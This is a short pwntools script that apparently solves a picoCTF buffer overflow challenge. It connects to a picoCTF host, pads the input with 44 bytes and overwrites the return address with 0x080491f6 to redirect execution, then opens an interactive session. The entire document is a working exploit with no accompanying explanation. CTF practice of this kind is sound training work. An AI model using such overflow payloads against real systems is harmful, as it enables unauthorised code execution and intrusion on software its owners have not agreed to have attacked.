from pwn import *

p = remote('saturn.picoctf.net', 62908)
elf = ELF('./vuln')

offset = 44
junk = b'A' * offset

payload = junk
payload += p32(0x080491f6)

p.sendline(payload)
p.interactive()